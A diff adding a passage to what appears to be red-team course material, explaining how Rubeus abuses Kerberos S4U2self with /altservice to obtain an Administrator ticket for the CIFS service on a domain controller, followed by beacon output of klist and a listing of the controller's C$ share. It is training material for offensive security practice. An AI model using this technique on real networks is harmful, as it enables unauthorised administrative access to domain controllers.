@@ -90,3 +90,40 @@ Where:
 
       doIF/[...snip...]kYy0x
 ```
+
+Rubeus performs an S4U2self request exactly as we saw with [constrained delegation](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=6731fd211c053b7aa602ab3b) when 'Kerberos only' is in use, i.e. for the target user where the service is the computer's own SamAccountName (_Administrator@LON-DC-1$_).  This returns a valid service ticket that would normally be used in an S4U2proxy request.  However, we can't do that since there is no constrained delegation here.  Instead, Rubeus simply swaps out the service name for the service specified in the `/altservice` parameter, which in this case becomes _Administrator@cifs/lon-dc-1_.  Again, this works because the CIFS service runs under the context of the computer account (i.e. SYSTEM), so the encrypted part of the ticket can still be decrypted.
+
+```powershell
+beacon> run klist
+
+Cached Tickets: (1)
+
+#0>	Client: Administrator @ CONTOSO.COM
+	Server: cifs/lon-dc-1 @ CONTOSO.COM
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize 
+	Start Time: 2/21/2025 12:42:53 (local)
+	End Time:   2/21/2025 20:38:58 (local)
+	Renew Time: 2/28/2025 10:38:58 (local)
+	Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	Cache Flags: 0 
+	Kdc Called: 
+
+beacon> ls \\lon-dc-1\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/24/2025 13:33:39   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     01/23/2025 15:46:17   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     02/21/2025 11:06:13   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     01/29/2025 10:42:20   System Volume Information
+          dir     01/24/2025 13:33:21   Users
+          dir     01/24/2025 13:49:56   Windows
+ 12kb     fil     02/21/2025 02:38:14   DumpStack.log.tmp
+ 1gb      fil     02/21/2025 02:38:14   pagefile.sys
+```
